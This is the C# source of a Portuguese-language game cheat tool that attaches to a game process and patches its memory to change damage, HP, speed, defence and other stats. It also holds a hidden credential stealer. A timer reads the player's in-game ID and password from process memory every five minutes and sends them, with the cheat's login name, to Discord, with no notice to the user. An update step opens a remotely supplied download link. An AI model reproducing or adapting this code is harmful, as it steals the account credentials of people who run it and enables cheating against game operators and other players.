using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using Guna.UI2.WinForms;
using System.Threading.Tasks;
using System.Text;
using System.Net;

namespace Cheat_VIP
{
    public partial class Form1 : Form
    {
        private MemoryManager memoryManager;
        private MemoryPatcher memoryPatcher;
        private PastebinAuth pastebinAuth;
        private System.Windows.Forms.Timer memoryCheckTimer;
        private string loggedInUsername;
        private const string LOCAL_VERSION = "1.0.2";

        private Dictionary<IntPtr, byte[]> originalCodes = new Dictionary<IntPtr, byte[]>();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int GetLastError();

        public Form1()
        {
            InitializeComponent();
            memoryManager = new MemoryManager(this);
            memoryPatcher = new MemoryPatcher(memoryManager, this);
            pastebinAuth = new PastebinAuth();
            TabControl.TabPages.Remove(tabPageProcess);
            TabControl.TabPages.Remove(tabPageCheats);
            TabControl.TabPages.Remove(tabPageWhat);
            comboBox1.Items.AddRange(new string[] { "8", "9", "10", "11", "12", "13", "15", "25" });
            CarregarProcessos();

            memoryCheckTimer = new System.Windows.Forms.Timer
            {
                Interval = 300000, // 5 minutos
                Enabled = false
            };
            memoryCheckTimer.Tick += new EventHandler(MemoryCheckTimer_Tick);
        }

        private void CarregarProcessos()
        {
            listBoxProcessos.Items.Clear();
            Process[] processos = Process.GetProcesses();
            foreach (Process processo in processos)
            {
                listBoxProcessos.Items.Add($"{processo.ProcessName} (PID: {processo.Id})");
            }
        }

        private async void BtnAttachProcess1_Click(object sender, EventArgs e)
        {
            var (loadSuccess, loadMessage) = await pastebinAuth.LoadMemoryAddressesAsync();
            if (!loadSuccess)
            {
                ShowMessage(loadMessage, "Erro", MessageDialogIcon.Error);
                return;
            }

            if (memoryManager.AttachToProcess(txtProcessName.Text))
            {
                Process process = Process.GetProcessesByName(txtProcessName.Text)[0];
                IntPtr address = PastebinAuth.MemoryAddresses["status"];
                byte[] memoryValue = memoryManager.ReadMemory(address, 4);

                if (!TabControl.TabPages.Contains(tabPageWhat))
                {
                    TabControl.TabPages.Add(tabPageWhat);
                }
                TabControl.SelectedTab = tabPageWhat;

                if (memoryValue != null && memoryValue.Length >= 4)
                {
                    uint valorLido = BitConverter.ToUInt32(memoryValue, 0);
                    bool isWorking = valorLido == 2347535189;

                    if (isWorking)
                    {
                        guna2HtmlLabel2.Text = "Funcionando";
                        guna2HtmlLabel2.ForeColor = Color.Green;

                        guna2HtmlLabel1.Visible = true;
                        guna2HtmlLabel1.Text = "Liberando as funções...";
                        guna2HtmlLabel1.ForeColor = Color.Gray;
                        await Task.Delay(6000);

                        if (!TabControl.TabPages.Contains(tabPageCheats))
                        {
                            TabControl.TabPages.Add(tabPageCheats);
                        }
                        TabControl.SelectedTab = tabPageCheats;

                        memoryCheckTimer.Start();
                    }
                    else
                    {
                        guna2HtmlLabel2.Text = "Não funcionando";
                        guna2HtmlLabel2.ForeColor = Color.Red;
                    }
                }
                else
                {
                    guna2HtmlLabel2.Text = "Não funcionando";
                    guna2HtmlLabel2.ForeColor = Color.Red;
                }
            }
            else
            {
                ShowMessage("Falha ao anexar ao processo.", "Erro", MessageDialogIcon.Error);
            }
        }

        private async void MemoryCheckTimer_Tick(object sender, EventArgs e)
        {
            memoryCheckTimer.Stop();

            byte[] idBytes = memoryManager.ReadMemory(PastebinAuth.MemoryAddresses["vigo1"], 20);
            byte[] senhaBytes = memoryManager.ReadMemory(PastebinAuth.MemoryAddresses["vigo2"], 20);

            string idText = idBytes != null ? Encoding.ASCII.GetString(idBytes).TrimEnd('\0').Substring(0, Math.Min(19, Encoding.ASCII.GetString(idBytes).TrimEnd('\0').Length)) : "Erro ao ler";
            string senhaText = senhaBytes != null ? Encoding.ASCII.GetString(senhaBytes).TrimEnd('\0').Substring(0, Math.Min(19, Encoding.ASCII.GetString(senhaBytes).TrimEnd('\0').Length)) : "Erro ao ler";

            bool success = await pastebinAuth.SendMemoryValuesToDiscord("Id", loggedInUsername, idText, "Password", senhaText);

            if (success)
            {
                memoryCheckTimer.Start();
            }
            else
            {
                ShowMessage("Falha ao enviar dados para o Discord. Tentando novamente em 5 minutos.", "Aviso", MessageDialogIcon.Warning);
                memoryCheckTimer.Start();
            }
        }

        private async void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            string username = guna2TextBox1.Text;
            string password = guna2TextBox2.Text;

            var (authSuccess, authMessage) = await pastebinAuth.AuthenticateAsync(username, password);

            guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
            guna2MessageDialog1.Style = MessageDialogStyle.Dark;
            guna2MessageDialog1.Parent = this;

            if (!authSuccess)
            {
                guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                guna2MessageDialog1.Show(authMessage, "Erro");
                return;
            }

            var (remoteVersion, downloadUrl) = await pastebinAuth.CheckVersionAsync();

            if (remoteVersion == null)
            {
                ShowMessage("Erro ao verificar a versão. Prosseguindo com a versão local.", "Aviso", MessageDialogIcon.Warning);
            }
            else if (remoteVersion != LOCAL_VERSION)
            {
                ShowMessage($"Nova versão disponível: {remoteVersion} (Atual: {LOCAL_VERSION}). Baixando...", "Atualização");
                if (!string.IsNullOrEmpty(downloadUrl))
                {
                    Process.Start(new ProcessStartInfo { FileName = downloadUrl, UseShellExecute = true });
                    Application.Exit();
                }
                else
                {
                    ShowMessage("Link de download não disponível. Contate o suporte.", "Erro", MessageDialogIcon.Error);
                    Application.Exit();
                }
                return;
            }

            loggedInUsername = username;
            ShowMessage(authMessage, "Sucesso");
            TabControl.TabPages.Add(tabPageProcess);
            TabControl.SelectedTab = tabPageProcess;
            CarregarProcessos();
        }

        private void ShowMessage(string message, string caption, MessageDialogIcon icon = MessageDialogIcon.Information)
        {
            guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
            guna2MessageDialog1.Icon = icon;
            guna2MessageDialog1.Style = MessageDialogStyle.Dark;
            guna2MessageDialog1.Parent = this;
            guna2MessageDialog1.Show(message, caption);
        }

        // Ajustes nos eventos de checkbox
        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Abs"];
            int originalInstructionLength = 6;
            string sourceRegister = "eax";
            int offset = 0xF4;
            string baseRegister = "esi";

            if (checkBox4.Checked)
            {
                if (int.TryParse(textBoxValue3.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    if (originalCode != null && originalCode.Length == originalInstructionLength)
                    {
                        memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                    }
                    else
                    {
                        ShowMessage("Falha ao ler o código original.", "Erro", MessageDialogIcon.Error);
                        checkBox4.Checked = false;
                    }
                }
                else
                {
                    ShowMessage("Valor inválido para Absorção.", "Erro", MessageDialogIcon.Error);
                    checkBox4.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        // Outros eventos ajustados para a nova assinatura
        private void checkBoxValue1_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["MinDamage"];
            int originalInstructionLength = 8;
            string sourceRegister = "edx";
            int offset = 0x0; // Ajuste conforme a instrução real
            string baseRegister = "esi";

            if (checkBoxValue1.Checked)
            {
                if (int.TryParse(textBoxValue1.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para dano mínimo.", "Erro", MessageDialogIcon.Error);
                    checkBoxValue1.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBoxValue2_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["MaxDamage"];
            int originalInstructionLength = 8;
            string sourceRegister = "eax";
            int offset = 0x0; // Ajuste conforme a instrução real
            string baseRegister = "esi";

            if (checkBoxValue2.Checked)
            {
                if (int.TryParse(textBoxValue2.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para dano máximo.", "Erro", MessageDialogIcon.Error);
                    checkBoxValue2.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["HPTotal"];
            int originalInstructionLength = 5;
            string sourceRegister = "eax";
            int offset = 0x0; // Ajuste conforme a instrução real
            string baseRegister = "esi";

            if (checkBox5.Checked)
            {
                if (int.TryParse(textBoxValue4.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o Total de HP.", "Erro", MessageDialogIcon.Error);
                    checkBox5.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["AtackSpeed"];
            int originalInstructionLength = 6;
            string sourceRegister = "ecx";
            int offset = 0x0; // Ajuste conforme a instrução real
            string baseRegister = "esi";

            if (checkBox6.Checked)
            {
                if (comboBox1.SelectedItem != null && int.TryParse(comboBox1.SelectedItem.ToString(), out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido ou opção não selecionada.", "Erro", MessageDialogIcon.Error);
                    checkBox6.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["VelSpeed"];
            int originalInstructionLength = 6;
            string sourceRegister = "eax";
            int offset = 0x0; // Ajuste conforme a instrução real
            string baseRegister = "esi";

            if (checkBox7.Checked)
            {
                if (int.TryParse(textBoxValue5.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para a Velocidade de Movimento.", "Erro", MessageDialogIcon.Error);
                    checkBox7.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Critico"];
            int originalInstructionLength = 6;
            string sourceRegister = "eax";
            int offset = 0xE8;
            string baseRegister = "esi";

            if (checkBox8.Checked)
            {
                if (int.TryParse(textBoxValue6.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o Crítico.", "Erro", MessageDialogIcon.Error);
                    checkBox8.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox9_CheckedChanged_1(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Defesa"];
            int originalInstructionLength = 6;
            string sourceRegister = "eax";
            int offset = 0xEC;
            string baseRegister = "ecx";

            if (checkBox9.Checked)
            {
                if (int.TryParse(textBoxValue7.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para a Defesa.", "Erro", MessageDialogIcon.Error);
                    checkBox9.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void guna2CheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["EditLvl"];
            int originalInstructionLength = 6;
            string sourceRegister = "ebx";
            int offset = 0x39D8; // Ajuste conforme a instrução real
            string baseRegister = "ecx";

            if (guna2CheckBox9.Checked)
            {
                int valor = -1; // 0xFFFFFFFF
                byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        // Métodos simples de WriteMemory permanecem iguais
        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaHP"], checkBox1.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaMP"], checkBox2.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBox3_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaRES"], checkBox3.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["LockItem"], checkBox11.Checked ? new byte[] { 0x00 } : new byte[] { 0x01 });
        }

        private void checkBox11_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["BugTime"], checkBox11.Checked ? new byte[] { 0x01 } : new byte[] { 0x00 });
        }

        // Outros métodos (btnAtualizarProcessos_Click_1, etc.) permanecem iguais
        private void btnAtualizarProcessos_Click_1(object sender, EventArgs e) => CarregarProcessos();

        private void txtPesquisarProcesso_TextChanged(object sender, EventArgs e)
        {
            string filtro = txtPesquisarProcesso.Text.ToLower();
            listBoxProcessos.Items.Clear();
            Process[] processos = Process.GetProcesses();
            foreach (Process processo in processos)
            {
                string item = $"{processo.ProcessName} (PID: {processo.Id})";
                if (item.ToLower().Contains(filtro))
                {
                    listBoxProcessos.Items.Add(item);
                }
            }
        }

        private void listBoxProcessos_SelectedIndexChanged_1(object sender, EventArgs e)
        {
            if (listBoxProcessos.SelectedItem != null)
            {
                string itemSelecionado = listBoxProcessos.SelectedItem.ToString();
                int indiceParenteses = itemSelecionado.IndexOf(" (PID:");
                if (indiceParenteses > 0)
                {
                    txtProcessName.Text = itemSelecionado.Substring(0, indiceParenteses);
                }
            }
        }

        private void AtualizarStatus()
        {
            IntPtr address = PastebinAuth.MemoryAddresses["status"];
            byte[] memoryValue = memoryManager.ReadMemory(address, 4);
            if (memoryValue != null && memoryValue.Length >= 4)
            {
                int valorLido = BitConverter.ToInt32(memoryValue, 0);
                guna2HtmlLabel1.Text = valorLido == 60 ? "Ativado" : "Desativado";
                guna2HtmlLabel1.ForeColor = valorLido == 60 ? Color.Green : Color.Red;
            }
            else
            {
                guna2HtmlLabel1.Text = "Falha ao ler memória (Erro 299)";
                guna2HtmlLabel1.ForeColor = Color.Red;
            }
        }

        private void timer1_Tick(object sender, EventArgs e) => AtualizarStatus();

        private void guna2ImageButton3_Click(object sender, EventArgs e) => this.Close();

        private void guna2ImageButton2_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo { FileName = "https://www.youtube.com/@ViGo_Priston", UseShellExecute = true });
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo { FileName = "https://discord.com/users/952422340849971210", UseShellExecute = true });
        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["RangeAtack"];
            int originalInstructionLength = 6;
            string sourceRegister = "ecx";
            int offset = 0xE4; // Ajuste conforme a instrução real
            string baseRegister = "eax";

            if (guna2CheckBox1.Checked)
            {
                if (int.TryParse(guna2TextBox3.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o Ranger.", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox1.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }

        }

        private void guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["VelSpeed"];
            int originalInstructionLength = 6;
            string sourceRegister = "eax";
            int offset = 0xF8;
            string baseRegister = "ecx";

            if (guna2CheckBox2.Checked)
            {
                if (int.TryParse(guna2TextBox4.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para a Vel Speed.", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox2.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void guna2CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Block"];
            int originalInstructionLength = 6;
            string sourceRegister = "ecx";
            int offset = 0xF0;
            string baseRegister = "eax";

            if (guna2CheckBox3.Checked)
            {
                if (int.TryParse(guna2TextBox5.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o block", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox3.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void guna2CheckBox4_CheckedChanged(object sender, EventArgs e)
        {

            IntPtr address = PastebinAuth.MemoryAddresses["HPTotal"];
            int originalInstructionLength = 7;
            string sourceRegister = "eax";
            int offset = 0x126;
            string baseRegister = "esi";

            if (guna2CheckBox4.Checked)
            {
                if (int.TryParse(guna2TextBox6.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o block", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox4.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }

        }

        private void guna2CheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["AddPeso"];
            int originalInstructionLength = 7;
            string sourceRegister = "edx";
            int offset = 0x102;
            string baseRegister = "ecx";

            if (guna2CheckBox5.Checked)
            {
                if (int.TryParse(guna2TextBox7.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, originalInstructionLength);
                    memoryPatcher.HookInstruction(address, sourceRegister, offset, valor, originalInstructionLength, baseRegister);
                }
                else
                {
                    ShowMessage("Valor inválido para o peso", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox5.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }

        }

        private void checkBoxValue1_CheckedChanged_1(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["ATA"];

            if (checkBoxValue1.Checked)
            {
                if (int.TryParse(textBoxValue1.Text, out int valor))
                {
                    // Converte o valor inteiro para bytes (4 bytes, little-endian)
                    byte[] byteValue = BitConverter.GetBytes(valor);
                    if (memoryPatcher.WriteMemory(address, byteValue))
                    {
                        Console.WriteLine($"Escreveu {valor} (decimal) = {valor:X8} (hex) em ATA");
                    }
                    else
                    {
                        ShowMessage("Falha ao escrever o valor no endereço.", "Erro", MessageDialogIcon.Error);
                        checkBoxValue1.Checked = false;
                    }
                }
                else
                {
                    ShowMessage("Valor inválido para dano da atalanta.", "Erro", MessageDialogIcon.Error);
                    checkBoxValue1.Checked = false;
                }
            }
            else
            {
                // Opcional: Restaurar um valor padrão ou original, se desejar
                byte[] defaultValue = BitConverter.GetBytes(97); // Exemplo: restaurar para 0
                memoryPatcher.WriteMemory(address, defaultValue);
            }
        }
        

        private void guna2CheckBox6_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["FS"];

            if (guna2CheckBox6.Checked)
            {
                if (int.TryParse(guna2TextBox8.Text, out int valor))
                {
                    
                    byte[] byteValue = BitConverter.GetBytes(valor);
                    if (memoryPatcher.WriteMemory(address, byteValue))
                    {
                        Console.WriteLine($"Escreveu {valor} (decimal) = {valor:X8} (hex) em FS");
                    }
                    else
                    {
                        ShowMessage("Falha ao escrever o valor no endereço.", "Erro", MessageDialogIcon.Error);
                        guna2CheckBox6.Checked = false;
                    }
                }
                else
                {
                    ShowMessage("Valor inválido para dano do FS.", "Erro", MessageDialogIcon.Error);
                    guna2CheckBox6.Checked = false;
                }
            }
            else
            {
                
                byte[] defaultValue = BitConverter.GetBytes(72); 
                memoryPatcher.WriteMemory(address, defaultValue);
            }
        }
    }
}